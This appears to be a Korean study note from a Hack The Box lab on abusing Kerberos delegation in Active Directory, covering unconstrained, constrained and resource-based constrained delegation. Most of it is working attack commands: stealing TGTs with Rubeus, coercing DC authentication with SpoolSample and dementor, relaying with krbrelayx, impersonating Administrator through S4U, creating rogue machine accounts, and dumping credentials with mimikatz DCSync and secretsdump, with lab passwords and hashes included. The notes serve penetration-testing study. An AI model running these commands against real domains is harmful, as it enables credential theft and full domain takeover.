> 서비스도 하나의 계정인데, 유저와 따로 관리를 할 필요성에 의해서 만들어 졌다.

> 특정 서비스(A)를 이용하려면 다른 서비스(B)와도 상호작용이 필요한 경우가 있다. 원래대로라면 유저가 B와도 직접 인증/통신을 해야 한다.

> Delegation은 유저가 B와 직접 상호작용하는 대신, A가 유저의 권한(identity)을 대리하여 B에 접근하는 것을 말한다.

> 이때 B 입장에서는 A가 아니라 "유저 본인"이 요청한 것처럼 보인다.

> KDC(및 최종 서비스 B)는 ST의 cname이 "누구인지"는 확인하지만, 그 요청이 실제로 본인이 직접 보낸 것인지, Delegation으로 대리 제출된 것인지는 구분하지 않는다.

## Unconstrained Delegation
- 유저가 서비스에 인증하면 그 유저의 TGT 복사본이 서비스에 저장되고, 서비스는 이 TGT로 어떤 서비스든 ST를 요청해 유저 행세를 할 수 있다.

### Computers
#### Waiting for Privileged User Authentication
- 서비스 서버를 장악한 뒤, Domain Admin 같은 특권 계정이 로그인해오길 기다렸다가, 그때 LSASS에 저장되는 TGT를 Rubeus로 탈취하는 공격.
```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```
```powershell
Import-Module .\PowerView.ps1

Get-DomainGroup -MemberIdentity sarah.lafferty
```
```powershell
.\Rubeus.exe asktgs /ticket:<base64 ticket> /service:cifs/dc01.INLANEFREIGHT.local /ptt

.\Rubeus.exe renew /ticket:<base64 ticket> /ptt
```
```powershell
dir \\dc01.inlanefreight.local\c$
```

#### Leveraging the Printer Bug
- 원래 스풀러 서비스는 "프린터 상태 알림"을 위한 기능인데 인증 없이 (또는 매우 낮은 권한으로) 누구든 "어디로 콜백을 보내라"고 지정할 수 있다는 게 설계 결함.
- DC의 스풀러 서비스(MS-RPRN)에 "프린터 변경 알림을 내 서버로 보내라"고 RPC 요청을 보내, DC$ 계정이 공격자가 장악한 Unconstrained Delegation 서버로 강제 인증하게 만들어, DC$의 TGT를 즉시(기다림 없이) 탈취하는 기법.

```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```
```powershell
.\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local
```
```powershell
.\Rubeus.exe renew /ticket:<base64 ticket> /ptt
```
```powershell
.\mimikatz.exe

lsadump::dcsync /user:sarah.lafferty
```
```powershell
.\Rubeus.exe asktgt /rc4:0fcb586d2aec31967c8a310d1ac2bf50 /user:sarah.lafferty /ptt
```
```powershell
dir \\dc01.inlanefreight.local\c$
```

#### S4U2self for Non-Domain Controllers
- DC$의 TGT를 이용해 S4U2Self → S4U2Proxy를 거쳐, "Administrator 자격의 CIFS/dc01 서비스용 ST"를 발급받고, 이 ST로 DC01의 SMB(파일 공유)에 Administrator 권한으로 접근하여 시스템을 장악.
```powershell
.\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:CIFS/dc01.inlanefreight.local /ptt /ticket:<base64 ticket>
```
```powershell
ls \\dc01.inlanefreight.local\c$
```

### Users
- 가짜 DNS 레코드(공격자 IP를 가리킴)를 등록하고, 장악한 Unconstrained Delegation 컴퓨터에 그 DNS 이름으로 SPN(CIFS/fake-machine)을 추가.
- 피해자가 그 가짜 머신에 SMB 접속을 시도할 때 발급되는 TGS에 TGT가 함께 실려 공격자 머신으로 전송되므로, 이를 가로채 탈취하는 기법이다.
```powershell
Import-Module .\PowerView.ps1

Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```
```bash
git clone -q https://github.com/dirkjanm/krbrelayx; cd krbrelayx

python dnstool.py -u INLANEFREIGHT.LOCAL\\pixis -p p4ssw0rd -r roguecomputer.INLANEFREIGHT.LOCAL -d 10.10.14.2 --action add 10.129.1.207

nslookup roguecomputer.inlanefreight.local dc01.inlanefreight.local
```
```bash
# KDC가 roguecomputer를 인식하도록 SPN을 등록해 주는 것.
python addspn.py -u inlanefreight.local\\pixis -p p4ssw0rd --target-type samname -t sqldev -s CIFS/roguecomputer.inlanefreight.local 
```
```bash
# Printer Bug
python dementor.py -u pixis -p p4ssw0rd -d inlanefreight.local roguecomputer.inlanefreight.local dc01.inlanefreight.local
```
```bash
sudo python krbrelayx.py -hashes :cf3a5525ee9414229e66279623ed5c58
```
```bash
export KRB5CCNAME=./DC01\$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache

secretsdump.py -k -no-pass dc01.inlanefreight.local
```

## Constrained Delegation
- 서비스(A)가 KDC에 User가 서비스(A)에 접근할 때 썼던 티켓을 그대로 `additional tickets`로 첨부 제출하면서, "이 티켓 속 유저(cname) 자격으로 서비스(B)용 새 ST를 발급해달라"고 요청하는 것(S4U2Proxy)
- `cname-in-addl-tkt` 플래그를 통해 KDC는 서비스가 아니라 첨부 티켓 속 cname(User) 기준으로 발급 대상을 판단
- 단, 서비스(A)의 `msDS-AllowedToDelegateTo` 속성에 서비스(B)가 명시되어 있어야만 발급 가능
- (S4U2Self) User가 실제로 서비스(A)에 접근한 적이 없어도, A가 자신의 TGT를 근거로 KDC에 직접 요청해 "User가 A에 인증했다"는 TGS를 새로 발급받을 수 있다
- 가장 높은 권한을 얻는 것이 공격에 가장 부합하기 때문에 `Administrator` 유저로 사칭해서 요청.

### Windows
```powershell
Import-Module .\PowerView.ps1

Get-DomainComputer -TrustedToAuth
```
```powershell
.\mimikatz.exe privilege::debug sekurlsa::msv exit
```
```powershell
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:HTTP /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /ptt

.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:wsman /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /ptt

.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:host /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /ptt
```
```powershell
Enter-PSSession ws01.inlanefreight.local
```

### Linux
```bash
impacket-findDelegation INLANEFREIGHT.LOCAL/carole.rose:jasmine
```
```bash
impacket-getST -spn TERMSRV/DC01 'INLANEFREIGHT.LOCAL/beth.richards:B3thR!ch@rd$' -impersonate Administrator
```
```bash
export KRB5CCNAME=./Administrator.ccache

psexec.py -k -no-pass INLANEFREIGHT.LOCAL/administrator@DC01 -debug
```

## Resource-Based Constrained Delegation
- 위임 가능 여부를 자원을 가진 쪽(B)이 자기 객체 속성(msDS-AllowedToActOnBehalfOfOtherIdentity)에 "A를 신뢰한다"고 설정하는 방식.
- Domain Admin 권한 없이도 B에 대한 쓰기 권한만 있으면 수정 가능하다.

### Windows
```powershell
# import the PowerView module
Import-Module C:\Tools\PowerView.ps1

# get all computers in the domain
$computers = Get-DomainComputer

# get all users in the domain
$users = Get-DomainUser

# define the required access rights
$accessRights = "GenericWrite","GenericAll","WriteProperty","WriteDacl"

# loop through each computer in the domain
foreach ($computer in $computers) {
    # get the security descriptor for the computer
    $acl = Get-ObjectAcl -SamAccountName $computer.SamAccountName -ResolveGUIDs

    # loop through each user in the domain
    foreach ($user in $users) {
        # check if the user has the required access rights on the computer object
        $hasAccess = $acl | ?{$_.SecurityIdentifier -eq $user.ObjectSID} | %{($_.ActiveDirectoryRights -match ($accessRights -join '|'))}

        if ($hasAccess) {
            Write-Output "$($user.SamAccountName) has the required access rights on $($computer.Name)"
        }
    }
}
```
```powershell
Import-Module .\Powermad.ps1

New-MachineAccount -MachineAccount HACKTHEBOX -Password $(ConvertTo-SecureString "Hackthebox123+!" -AsPlainText -Force)
```
```powershell
Import-Module .\PowerView.ps1

$ComputerSid = Get-DomainComputer HACKTHEBOX -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

$credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)

Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose
```
```powershell
.\Rubeus.exe hash /password:Hackthebox123+! /user:HACKTHEBOX$ /domain:inlanefreight.local

.\Rubeus.exe s4u /user:HACKTHEBOX$ /rc4:CF767C9A9C529361F108AA67BF1B3695 /impersonateuser:administrator /msdsspn:cifs/dc01.inlanefreight.local /ptt
```
```powershell
klist

ls \\dc01.inlanefreight.local\c$
```

#### Clear
```powershell
Import-Module .\PowerView.ps1

$credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)

Get-DomainComputer DC01 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity -Credential $credentials -Verbose
```
